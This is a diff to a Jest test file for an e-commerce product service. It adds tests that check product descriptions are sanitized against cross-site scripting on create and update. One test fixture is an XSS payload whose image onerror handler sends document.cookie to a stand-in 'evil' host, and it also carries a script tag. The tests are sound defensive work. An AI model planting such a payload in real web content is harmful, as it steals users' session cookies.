@@ -12,6 +12,7 @@ import { ProductReview } from "./entity/product-review.entity";
 import { ProductSku } from "./entity/product-sku.entity";
 import { WishlistItem } from "./entity/wishlist-item.entity";
 import { ProductImageHashService } from "./product-image-hash.service";
+import { CreateProductDto } from "./dto/create-product.dto";
 
 type SkuRow = Pick<
   ProductSku,
@@ -303,6 +304,7 @@ describe("ProductService.findAllProducts storefront visibility (BUG-B)", () => {
     addSelect: jest.fn(),
     distinct: jest.fn(),
     orderBy: jest.fn(),
+    addOrderBy: jest.fn(),
     offset: jest.fn(),
     limit: jest.fn(),
     getRawMany: jest.fn(),
@@ -338,6 +340,7 @@ describe("ProductService.findAllProducts storefront visibility (BUG-B)", () => {
       "addSelect",
       "distinct",
       "orderBy",
+      "addOrderBy",
       "offset",
       "limit",
     ] as const) {
@@ -584,5 +587,98 @@ describe("ProductService media cleanup — description images (UP-03)", () => {
     await flushCleanup();
 
     expect(destroyAssets).not.toHaveBeenCalled();
+  });
+});
+
+describe("ProductService description sanitizing (XSS-DESC-01)", () => {
+  const payload = `<p>ok</p><img src=x onerror="fetch('//evil/?c='+document.cookie)"><script>alert(1)</script>`;
+
+  const productRepository = {
+    create: jest.fn((row: Partial<Product>) => row),
+    save: jest.fn((row: Partial<Product>) =>
+      Promise.resolve({ ...row, id: 9 }),
+    ),
+  };
+  const categoryRepository = {
+    findBy: jest.fn(() => Promise.resolve([{ id: 1, status: "active" }])),
+  };
+  const manager = {
+    createQueryBuilder: jest.fn(() => ({
+      setLock: jest.fn().mockReturnThis(),
+      select: jest.fn().mockReturnThis(),
+      where: jest.fn().mockReturnThis(),
+      getRawOne: jest.fn(() => Promise.resolve({ product_id: "9" })),
+    })),
+    findOne: jest.fn(),
+    save: jest.fn((row: Product) => Promise.resolve(row)),
+  };
+  const dataSource = {
+    transaction: jest.fn((work: (entityManager: EntityManager) => unknown) =>
+      work(manager as unknown as EntityManager),
+    ),
+  };
+  const cachedService = { keys: jest.fn(() => Promise.resolve([])) };
+
+  let service: ProductService;
+
+  beforeEach(() => {
+    jest.clearAllMocks();
+    service = new ProductService(
+      productRepository as unknown as Repository<Product>,
+      {} as unknown as Repository<Brand>,
+      categoryRepository as unknown as Repository<Category>,
+      {} as unknown as Repository<ProductReview>,
+      {} as unknown as Repository<ProductSku>,
+      {} as unknown as Repository<WishlistItem>,
+      dataSource as unknown as DataSource,
+      cachedService as unknown as CachedService,
+      { destroyAssets: jest.fn() } as unknown as CloudinaryService,
+      {} as unknown as ProductImageHashService,
+      null,
+      { send: jest.fn(), connect: jest.fn() } as unknown as ClientProxy,
+    );
+    jest.spyOn(service, "processRiskScoringQueue").mockResolvedValue();
+    manager.findOne.mockResolvedValue({
+      id: 9,
+      version: 1,
+      imageUrls: [],
+      description: "<p>old</p>",
+      variations: null,
+    });
+  });
+
+  it("stores a cleaned description on create", async () => {
+    const created = await service.createProduct({
+      name: "Shoe",
+      price: 1000,
+      categoryIds: [1],
+      description: payload,
+    } as unknown as CreateProductDto);
+
+    expect(created.description).toBe("<p>ok</p>");
+  });
+
+  it("stores a cleaned description on update", async () => {
+    const updated = await service.updateProduct(9, {
+      description: payload,
+    });
+
+    expect(updated.description).toBe("<p>ok</p>");
+  });
+
+  it("still lets an update clear the description with null", async () => {
+    const updated = await service.updateProduct(9, {
+      description: null,
+    });
+
+    expect(updated.description).toBeNull();
+  });
+
+  it("leaves the description alone when the update does not send it", async () => {
+    const updated = await service.updateProduct(9, {
+      name: "Renamed",
+    });
+
+    expect(updated.description).toBe("<p>old</p>");
   });
 });
